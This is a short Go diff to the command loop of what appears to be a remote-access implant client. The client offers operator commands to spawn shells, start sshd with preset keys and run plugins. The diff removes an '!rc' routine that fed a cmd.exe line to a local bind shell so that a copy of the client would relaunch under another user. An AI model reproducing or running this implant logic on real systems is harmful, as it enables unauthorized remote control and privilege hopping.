@@ -10,7 +10,6 @@ import (
 	"os/user"
 	"strconv"
 	"strings"
-	"time"
 
 	"../meter"
 	"../plugins"
@@ -53,12 +52,12 @@ func Run(s *yamux.Session, c net.Conn) {
 				usage += "   - lists available plugins\n"
 				usage += " !plugin <plugin>\n"
 				usage += "   - execute a plugin\n"
-				usage += " !rc <port>\n"
-				usage += "   - connects to a local bind shell and restarts this client over it\n"
 				usage += " !spawn <port>\n"
 				usage += "   - spawns another client on the specified port\n"
 				usage += " !shell\n"
+				usage += "   - runs /bin/sh\n"
 				usage += " !ssh <port>\n"
+				usage += "   - starts sshd with the configured keys on the specified port\n"
 				usage += " !exit\n"
 				c.Write([]byte(usage))
 				prompt(c)
@@ -147,19 +146,6 @@ func Run(s *yamux.Session, c net.Conn) {
 					c.Write([]byte("Usage: !plugin <name>\n"))
 				}
 				prompt(c)
-			case "!rc":
-				if len(argv) == 2 {
-					rPort := argv[1]
-					lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
-					err := rc(lIP, lPort, rPort)
-					if err == nil {
-						// no error, this shell should restart in a new user context
-						return
-					}
-				} else {
-					c.Write([]byte("Usage: !rc <port>\n"))
-				}
-				prompt(c)
 			case "!spawn":
 				if len(argv) == 2 {
 					port := argv[1]
@@ -206,17 +192,4 @@ func Run(s *yamux.Session, c net.Conn) {
 			prompt(c)
 		}
 	}
-}
-
-func rc(lIP string, lPort string, rPort string) error {
-	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", rPort))
-	if err != nil {
-		return err
-	}
-	path := shell.CopySelf()
-	cmd := fmt.Sprintf("c:\\windows\\system32\\cmd.exe /c %s %s %s\r\n", path, lIP, lPort)
-	conn.Write([]byte(cmd))
-	time.Sleep(5000 * time.Millisecond)
-	conn.Close()
-	return nil
 }
